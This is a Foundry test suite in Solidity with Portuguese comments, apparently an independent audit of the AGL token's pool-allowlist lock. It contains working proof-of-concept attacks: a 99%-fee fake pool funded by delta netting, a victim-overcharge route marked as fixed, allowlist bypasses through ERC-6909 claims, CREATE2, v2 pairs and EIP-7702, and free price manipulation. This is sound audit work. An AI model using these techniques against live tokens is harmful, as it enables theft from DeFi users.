// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// Auditoria independente — trava "só a pool oficial", taxas e preço.
// Rodar (cada chamada de topo = uma transação, transient storage zerado entre elas):
//   REDE=base forge test --match-path 'test/auditoria/*' --isolate -vv
// Sem --isolate o Foundry mantém o transient storage entre as chamadas do teste
// inteiro e a cota "sobra" de um passo para o outro (verde/vermelho falso).

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {BalanceDelta} from "v4-core/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "v4-core/types/PoolOperation.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "v4-core/libraries/TransientStateLibrary.sol";
import {PoolSwapTest} from "v4-core/test/PoolSwapTest.sol";
import {LiquidityAmounts} from "v4-periphery/libraries/LiquidityAmounts.sol";
import {AGL} from "../../src/AGL.sol";
import {PoolAGL} from "../../src/PoolAGL.sol";
import {BaseAGL} from "../BaseAGL.sol";

interface IFiatTokenA {
    function blacklister() external view returns (address);
    function blacklist(address) external;
}

interface IV2Factory {
    function createPair(address, address) external returns (address);
    function getPair(address, address) external view returns (address);
}

interface IV2Pair {
    function mint(address) external returns (uint256);
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

/// Contrato qualquer FORA da lista do AGL que executa ações no PoolManager.
contract Operador is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;
    Currency public immutable agl;
    Currency public immutable usdc;

    uint8 constant SWAP = 0;
    uint8 constant INIT = 1;
    uint8 constant ADDLIQ = 2;
    uint8 constant MINT6909 = 3;
    uint8 constant BURN6909 = 4;
    uint8 constant QUITAR = 5;

    struct Acao {
        uint8 tipo;
        bytes dados;
    }

    constructor(IPoolManager _pm, Currency _agl, Currency _usdc) {
        pm = _pm;
        agl = _agl;
        usdc = _usdc;
    }

    function executar(Acao[] calldata _a) external {
        pm.unlock(abi.encode(_a));
    }

    /// Dois unlocks na MESMA transação.
    function executar2(Acao[] calldata _a, Acao[] calldata _b) external {
        pm.unlock(abi.encode(_a));
        pm.unlock(abi.encode(_b));
    }

    function transferir6909(address _para, uint256 _v) external {
        pm.transfer(_para, uint256(uint160(Currency.unwrap(agl))), _v);
    }

    function unlockCallback(bytes calldata _d) external returns (bytes memory) {
        require(msg.sender == address(pm));
        Acao[] memory a = abi.decode(_d, (Acao[]));
        for (uint256 i; i < a.length; i++) {
            uint8 tp = a[i].tipo;
            if (tp == SWAP) {
                (PoolKey memory k, bool zfo, int256 qtd) = abi.decode(a[i].dados, (PoolKey, bool, int256));
                pm.swap(k, SwapParams(zfo, qtd, zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1), "");
            } else if (tp == INIT) {
                (PoolKey memory k, uint160 sp) = abi.decode(a[i].dados, (PoolKey, uint160));
                pm.initialize(k, sp);
            } else if (tp == ADDLIQ) {
                (PoolKey memory k, int24 lo, int24 hi, int256 liq) =
                    abi.decode(a[i].dados, (PoolKey, int24, int24, int256));
                pm.modifyLiquidity(k, ModifyLiquidityParams(lo, hi, liq, 0), "");
            } else if (tp == MINT6909) {
                (address para, uint256 v) = abi.decode(a[i].dados, (address, uint256));
                pm.mint(para, uint256(uint160(Currency.unwrap(agl))), v);
            } else if (tp == BURN6909) {
                uint256 v = abi.decode(a[i].dados, (uint256));
                pm.burn(address(this), uint256(uint160(Currency.unwrap(agl))), v);
            } else if (tp == QUITAR) {
                address para = abi.decode(a[i].dados, (address));
                _quitar(agl, para);
                _quitar(usdc, para);
            }
        }
        return "";
    }

    function _quitar(Currency c, address _para) internal {
        int256 d = pm.currencyDelta(address(this), c);
        if (d < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d));
            pm.settle();
        } else if (d > 0) {
            pm.take(c, _para, uint256(d));
        }
    }
}

/// Contrato cujo endereço recebe AGL ANTES de existir (code.length == 0).
contract Nascente {
    function sacar(IERC20 _t, address _para) external {
        _t.transfer(_para, _t.balanceOf(address(this)));
    }
}

contract SemSaida {}

contract TravaAuditoria is BaseAGL {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    Operador op;
    PoolKey falsa;
    bool t0;
    address vitima = makeAddr("vitima");

    uint24 constant TAXA_FALSA = 990_000; // 99%
    int24 constant ESP_FALSA = 60;

    function setUp() public override {
        super.setUp();
        _lancar();
        t0 = pool.tokenEhMoeda0();
        op = new Operador(PM, pool.token(), pool.moeda());
        falsa = pool.chave();
        falsa.fee = TAXA_FALSA;
        falsa.tickSpacing = ESP_FALSA;
        falsa.hooks = IHooks(address(0));
        assertFalse(t.permitido(address(op)), "operador fora da lista");
        assertGt(address(op).code.length, 0);
    }

    // ------------------------------------------------------------ helpers

    function _a(uint8 tp, bytes memory d) internal pure returns (Operador.Acao memory) {
        return Operador.Acao(tp, d);
    }

    /// zeroForOne de "comprar AGL" nesta pool (mesma ordem nas duas chaves).
    function _zfoCompra() internal view returns (bool) {
        return !t0;
    }

    function _tickRedondo(int24 tk) internal pure returns (int24) {
        return (tk / ESP_FALSA) * ESP_FALSA;
    }

    /// Faixa da pool falsa só do lado do AGL, logo acima (t0) / abaixo (t1) do preço.
    function _faixaFalsa() internal view returns (int24 lo, int24 hi) {
        int24 ti = _tickRedondo(int24(vm.parseJsonInt(json, ".tickInicial")));
        if (t0) (lo, hi) = (ti + ESP_FALSA, ti + 6000);
        else (lo, hi) = (ti - 6000, ti - ESP_FALSA);
    }

    function _liqFalsa(uint256 qtdAgl) internal view returns (uint128) {
        (int24 lo, int24 hi) = _faixaFalsa();
        uint160 a = TickMath.getSqrtPriceAtTick(lo);
        uint160 b = TickMath.getSqrtPriceAtTick(hi);
        return t0
            ? LiquidityAmounts.getLiquidityForAmount0(a, b, qtdAgl)
            : LiquidityAmounts.getLiquidityForAmount1(a, b, qtdAgl);
    }

    /// Cria a pool falsa (99%, sem hook) e põe nela AGL COMPRADO NA OFICIAL no mesmo
    /// unlock: o AGL nunca sai do PoolManager, então a trava nem é consultada.
    function _criarFalsaPorCompensacao(uint256 Q) internal {
        deal(MOEDA, address(op), _unid(1_000_000));
        int24 ti = _tickRedondo(int24(vm.parseJsonInt(json, ".tickInicial")));
        (int24 lo, int24 hi) = _faixaFalsa();
        Operador.Acao[] memory a = new Operador.Acao[](4);
        a[0] = _a(0, abi.encode(pool.chave(), _zfoCompra(), int256(Q))); // compra exata Q na oficial
        a[1] = _a(1, abi.encode(falsa, TickMath.getSqrtPriceAtTick(ti)));
        a[2] = _a(2, abi.encode(falsa, lo, hi, int256(uint256(_liqFalsa(Q * 9 / 10)))));
        a[3] = _a(5, abi.encode(atacante));
        op.executar(a);
    }

    function _liqPosFalsa() internal view returns (uint128) {
        (int24 lo, int24 hi) = _faixaFalsa();
        bytes32 pos = keccak256(abi.encodePacked(address(op), lo, hi, bytes32(0)));
        return PM.getPositionLiquidity(falsa.toId(), pos);
    }

    // ================================================================ A1
    /// A1: pool v4 de terceiro (sem hook, taxa 99%) recebe AGL por COMPENSAÇÃO de
    /// deltas dentro do mesmo unlock (compra na oficial → liquidez na falsa).
    function test_A1_pool_falsa_99pct_recebe_AGL_por_compensacao() public {
        uint256 Q = 1e9 * 1e9 * 1000; // 1e12 AGL (~US$1.000 a 1e-9)
        uint256 pmAntes = t.balanceOf(address(PM));
        _criarFalsaPorCompensacao(Q);
        (uint160 sp,,,) = PM.getSlot0(falsa.toId());
        assertGt(sp, 0, "pool falsa inicializada");
        assertGt(_liqPosFalsa(), 0, "pool falsa TEM liquidez em AGL");
        // ~90% de Q ficou depositado na falsa; o resto saiu para o atacante pela cota.
        assertApproxEqRel(pmAntes - t.balanceOf(address(PM)), Q / 10, 0.01e18, "so a sobra saiu do PM");
        emit log_named_uint("AGL na pool falsa (unid.)", Q * 9 / 10);
    }

    /// A1b: um roteador comum (PoolSwapTest) NÃO consegue comprar da falsa sozinho
    /// (o take do AGL esbarra na cota). Roda em transação separada (--isolate).
    function test_A1b_roteador_comum_nao_compra_da_falsa() public {
        _criarFalsaPorCompensacao(1e21);
        deal(MOEDA, vitima, _unid(100));
        vm.startPrank(vitima);
        IERC20(MOEDA).approve(address(router), type(uint256).max);
        vm.expectRevert();
        router.swap(
            falsa,
            SwapParams(
                _zfoCompra(), int256(1e18), _zfoCompra() ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            ),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
        vm.stopPrank();
    }

    // ================================================================ A2
    /// A2 (CORRIGIDO 07/11 com a cota líquida): antes, ida e volta na oficial deixava cota
    /// de SAÍDA aberta e um roteador comprava na pool FALSA e entregava à vítima. Agora a
    /// ida e volta zera a cota e o take da pool falsa reverte.
    function test_A2_cota_fabricada_compra_na_falsa_vitima_paga_99pct() public {
        _criarFalsaPorCompensacao(1e21);
        uint256 Y = 1e20; // 1e11 AGL
        uint256 Z = 1e19; // 1e10 AGL que a "vítima" compra na falsa
        deal(MOEDA, address(op), _unid(1_000_000));
        uint256 usdcAntes = IERC20(MOEDA).balanceOf(address(op));

        Operador.Acao[] memory a = new Operador.Acao[](3);
        a[0] = _a(0, abi.encode(pool.chave(), _zfoCompra(), int256(Y))); // compra Y (saída exata)
        a[1] = _a(0, abi.encode(pool.chave(), !_zfoCompra(), -int256(Y))); // vende Y (entrada exata)
        a[2] = _a(5, abi.encode(address(op)));
        Operador.Acao[] memory b = new Operador.Acao[](2);
        b[0] = _a(0, abi.encode(falsa, _zfoCompra(), int256(Z))); // compra Z na FALSA
        b[1] = _a(5, abi.encode(vitima));
        vm.expectRevert();
        op.executar2(a, b);
        assertEq(t.balanceOf(vitima), 0);
        usdcAntes;
    }

    // ================================================================ A3
    /// A3: claims ERC-6909. Um contrato FORA da lista compra na oficial e guarda o AGL
    /// como claim no PoolManager (sem transferência = sem trava), passa o claim a outro
    /// contrato e depois vende na oficial queimando o claim. O AGL "econômico" circula
    /// livremente entre contratos não permitidos.
    function test_A3_claims_6909_burlam_lista_de_contratos() public {
        uint256 Q = 1e21;
        uint256 id = uint256(uint160(address(t)));
        deal(MOEDA, address(op), _unid(10_000));
        Operador.Acao[] memory a = new Operador.Acao[](3);
        a[0] = _a(0, abi.encode(pool.chave(), _zfoCompra(), int256(Q)));
        a[1] = _a(3, abi.encode(address(op), Q));
        a[2] = _a(5, abi.encode(address(op)));
        op.executar(a);
        assertEq(PM.balanceOf(address(op), id), Q, "contrato fora da lista detem 1e12 AGL em claim");
        assertEq(t.balanceOf(address(op)), 0);

        // passa metade do claim para outro contrato não permitido
        SemSaida outro = new SemSaida();
        op.transferir6909(address(outro), Q / 2);
        assertEq(PM.balanceOf(address(outro), id), Q / 2, "claim chegou a contrato nao permitido");

        // vende o resto na oficial queimando o claim, USDC vai para o atacante
        Operador.Acao[] memory b = new Operador.Acao[](3);
        b[0] = _a(4, abi.encode(Q / 2));
        b[1] = _a(0, abi.encode(pool.chave(), !_zfoCompra(), -int256(Q / 2)));
        b[2] = _a(5, abi.encode(atacante));
        op.executar(b);
        assertGt(IERC20(MOEDA).balanceOf(atacante), 0, "vendeu AGL que nunca existiu como ERC-20 no contrato");
    }

    // ================================================================ A4
    /// A4: contrato em construção/endereço ainda vazio recebe AGL e depois o move.
    function test_A4_endereco_sem_codigo_recebe_e_depois_vira_contrato() public {
        _comprar(atacante, _unid(10));
        bytes32 salt = keccak256("nascente");
        address previsto = vm.computeCreate2Address(salt, keccak256(type(Nascente).creationCode), address(this));
        uint256 v = t.balanceOf(atacante);
        vm.prank(atacante);
        t.transfer(previsto, v);
        Nascente n = new Nascente{salt: salt}();
        assertEq(address(n), previsto);
        assertFalse(t.permitido(address(n)));
        assertEq(t.balanceOf(address(n)), v, "contrato nao permitido custodia AGL");
        n.sacar(IERC20(address(t)), vitima);
        assertEq(t.balanceOf(vitima), v);
    }

    /// A4b: par Uniswap v2 (Base) pré-abastecido antes de existir vira pool de MÃO ÚNICA:
    /// dá para comprar AGL dele, mas ninguém consegue vender AGL de volta nele.
    function test_A4b_par_v2_preabastecido_mao_unica() public {
        if (block.chainid != 8453) return;
        IV2Factory f = IV2Factory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6);
        (address a0, address a1) = address(t) < MOEDA ? (address(t), MOEDA) : (MOEDA, address(t));
        address par = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            address(f),
                            keccak256(abi.encodePacked(a0, a1)),
                            hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f"
                        )
                    )
                )
            )
        );
        _comprar(atacante, _unid(100));
        uint256 v = t.balanceOf(atacante);
        vm.prank(atacante);
        t.transfer(par, v); // ainda sem código
        assertEq(f.createPair(address(t), MOEDA), par, "endereco previsto do par");
        deal(MOEDA, par, _unid(100));
        IV2Pair(par).mint(atacante);
        (uint112 r0, uint112 r1,) = IV2Pair(par).getReserves();
        assertGt(r0, 0);
        assertGt(r1, 0);
        // compra: USDC entra, AGL sai do par para a carteira (permitido)
        deal(MOEDA, vitima, _unid(10));
        vm.prank(vitima);
        IERC20(MOEDA).transfer(par, _unid(10));
        bool aglEh0 = IV2Pair(par).token0() == address(t);
        uint256 sai = v / 20;
        IV2Pair(par).swap(aglEh0 ? sai : 0, aglEh0 ? 0 : sai, vitima, "");
        assertEq(t.balanceOf(vitima), sai, "comprou AGL no par v2");
        // venda: AGL para o par -> trava
        vm.prank(vitima);
        vm.expectRevert(abi.encodeWithSelector(AGL.PoolNaoAutorizada.selector, par));
        t.transfer(par, sai);
    }

    /// A5: carteira EIP-7702 recebe AGL sem estar na lista — e pode delegar a QUALQUER
    /// código (inclusive uma AMM). Aqui: só a recepção (designador 0xef0100 || alvo).
    function test_A5_7702_recebe_sem_lista() public {
        address conta = makeAddr("conta7702");
        vm.etch(conta, abi.encodePacked(hex"ef0100", address(op)));
        assertEq(conta.code.length, 23);
        _comprar(atacante, _unid(1));
        uint256 v = t.balanceOf(atacante);
        vm.prank(atacante);
        t.transfer(conta, v);
        assertEq(t.balanceOf(conta), v);
    }

    // C1 e C2 foram corrigidos em 07/11 (saque por moeda, para destino escolhido):
    // teste em test/AGL.t.sol (test_C1_saque_por_moeda_nao_trava).

    // ================================================================ D (preço)
    /// D1: sem nenhum token, qualquer um leva o preço da pool OFICIAL até o MIN/MAX
    /// (abaixo do lançamento não há liquidez). Não custa nada e não tira dinheiro de
    /// ninguém, mas slot0 vira lixo para quem lê como oráculo.
    function test_D1_preco_empurrado_de_graca_abaixo_do_lancamento() public {
        int24 antes = _tick();
        vm.startPrank(atacante);
        router.swap(
            pool.chave(),
            SwapParams(t0, -int256(1e30), t0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
        vm.stopPrank();
        int24 depois = _tick();
        emit log_named_int("tick antes", antes);
        emit log_named_int("tick depois", depois);
        assertEq(t.balanceOf(atacante), 0);
        assertEq(IERC20(MOEDA).balanceOf(atacante), 0);
        if (t0) assertLt(depois, antes - 500_000);
        else assertGt(depois, antes + 500_000);
        // o comprador seguinte paga o preço da escada normalmente
        uint256 rec = _comprar(comprador, _unid(10));
        assertApproxEqRel(rec, 10e9 * 1e9 * 98 / 100, 0.02e18, "compra pelo preco do 1o degrau");
    }
}
